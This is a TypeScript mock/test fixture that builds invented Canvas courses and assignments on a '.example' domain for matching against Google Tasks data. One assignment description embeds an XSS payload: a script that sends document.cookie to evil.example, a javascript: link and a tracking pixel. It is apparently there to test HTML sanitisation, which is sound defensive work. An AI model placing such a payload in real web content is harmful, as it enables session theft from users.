/**
 * SYNTHETIC Canvas fixtures (mock mode and tests). Invented courses and assignments on the
 * reserved `.example` domain, aligned with the synthetic Google Tasks fixtures so matching can
 * be exercised. Raw objects use Canvas's JSON shape.
 */
import { addDays, type DateOnly } from "@scholar/domain";

export const MOCK_CANVAS_ORIGIN = "https://canvas.school.example";

/** A due instant at 23:59 US Eastern (standard time) on anchor+offset. */
const due = (anchor: DateOnly, offset: number) => `${addDays(anchor, offset)}T23:59:00-05:00`;
const at = (anchor: DateOnly, offset: number, hhmm: string) =>
  `${addDays(anchor, offset)}T${hhmm}:00-05:00`;

export interface MockCanvasDataset {
  courses: Array<Record<string, unknown>>;
  assignments: Record<string, Array<Record<string, unknown>>>;
}

export function buildMockCanvasDataset(anchor: DateOnly): MockCanvasDataset {
  const url = (course: number, a: number) =>
    `${MOCK_CANVAS_ORIGIN}/courses/${course}/assignments/${a}`;
  const sub = (workflow_state: string, extra: Record<string, unknown> = {}) => ({
    workflow_state,
    submitted_at: null,
    graded_at: null,
    late: false,
    missing: false,
    excused: false,
    attempt: null,
    ...extra,
  });
  return {
    courses: [
      {
        id: 1101,
        name: "BIO 110: Introductory Biology (synthetic)",
        course_code: "BIO 110",
        workflow_state: "available",
      },
      {
        id: 1102,
        name: "ENG 102: Writing and Argument (synthetic)",
        course_code: "ENG 102",
        workflow_state: "available",
      },
      {
        id: 2210,
        name: "MATH 221: Linear Algebra (synthetic)",
        course_code: "MATH 221",
        workflow_state: "available",
      },
      {
        id: 2040,
        name: "HIST 204: Modern Europe (synthetic)",
        course_code: "HIST 204",
        workflow_state: "available",
      },
    ],
    assignments: {
      "1101": [
        {
          id: 50011,
          name: "Lab Report: Enzyme Kinetics",
          description:
            '<h3>Lab report</h3><p>Write up the enzyme kinetics lab using the <a href="/courses/1101/files/9001">data sheet</a>.</p>' +
            "<ul><li>Introduction</li><li>Methods</li><li>Results with Michaelis–Menten plot</li></ul>" +
            '<script>document.location="https://evil.example/?c="+document.cookie</script>' +
            '<p><a href="javascript:alert(1)">Click me</a> <img src="https://evil.example/pixel.png" alt="tracking pixel"></p>',
          due_at: due(anchor, 0),
          unlock_at: at(anchor, -7, "08:00"),
          lock_at: null,
          html_url: url(1101, 50011),
          submission_types: ["online_upload"],
          points_possible: 50,
          rubric: [
            { description: "Introduction and hypothesis", points: 10 },
            { description: "Methods are reproducible", points: 15 },
            { description: "Results and analysis", points: 25 },
          ],
          is_quiz_assignment: false,
          submission: sub("unsubmitted"),
        },
        {
          id: 50012,
          name: "Quiz 4: Cellular Respiration",
          description: "<p>Online quiz. Closed notes.</p>",
          due_at: due(anchor, 3),
          html_url: url(1101, 50012),
          submission_types: ["online_quiz"],
          points_possible: 20,
          is_quiz_assignment: true,
          quiz_id: 7004,
          submission: sub("unsubmitted"),
        },
      ],
      "1102": [
        {
          id: 50042,
          name: "Essay Draft: Argument Outline",
          description: "<p>Submit a one-page outline of your argument.</p>",
          // Student-specific override: one day later than the Google Tasks date (A09).
          due_at: due(anchor, 6),
          html_url: url(1102, 50042),
          submission_types: ["online_text_entry"],
          points_possible: 10,
          // No `submission` key: as if the scoped key ignored include[]=submission.
        },
      ],
      "2210": [
        {
          id: 22106,
          name: "Problem Set 6",
          description: "<p>Sections 3.4–3.6.</p>",
          due_at: due(anchor, -3),
          html_url: url(2210, 22106),
          submission_types: ["online_upload"],
          points_possible: 25,
          submission: sub("unsubmitted", { missing: true, late: true }),
        },
        {
          id: 22107,
          name: "Problem Set 7",
          description: "<p>Sections 4.1–4.3, odd problems.</p>",
          due_at: due(anchor, 2),
          html_url: url(2210, 22107),
          submission_types: ["online_upload"],
          points_possible: 25,
          submission: sub("unsubmitted"),
        },
        {
          id: 22108,
          name: "Problem Set 7 Corrections",
          description: "<p>Optional corrections for Problem Set 7.</p>",
          due_at: due(anchor, 4),
          html_url: url(2210, 22108),
          submission_types: ["online_upload"],
          points_possible: 5,
          submission: sub("unsubmitted"),
        },
        {
          id: 22199,
          name: "Midterm Exam",
          description: "<p>In-class midterm covering chapters 1–4.</p>",
          due_at: at(anchor, 9, "10:00"),
          html_url: url(2210, 22199),
          submission_types: ["on_paper"],
          points_possible: 100,
          is_quiz_assignment: false,
          submission: sub("unsubmitted"),
        },
      ],
      "2040": [
        {
          id: 20409,
          name: "Reading Response: Chapter 9",
          description: "<p>300 words on chapter 9.</p>",
          due_at: due(anchor, -1),
          html_url: url(2040, 20409),
          submission_types: ["online_text_entry"],
          points_possible: 10,
          submission: sub("submitted", { submitted_at: at(anchor, -1, "21:15"), attempt: 1 }),
        },
        {
          id: 20410,
          name: "Primary Source Worksheet",
          description: "<p>Worksheet on the provided primary sources.</p>",
          due_at: due(anchor, -2),
          html_url: url(2040, 20410),
          submission_types: ["online_upload"],
          points_possible: 15,
          submission: sub("graded", {
            submitted_at: at(anchor, -3, "17:00"),
            graded_at: at(anchor, -1, "09:00"),
            attempt: 1,
          }),
        },
      ],
    },
  };
}
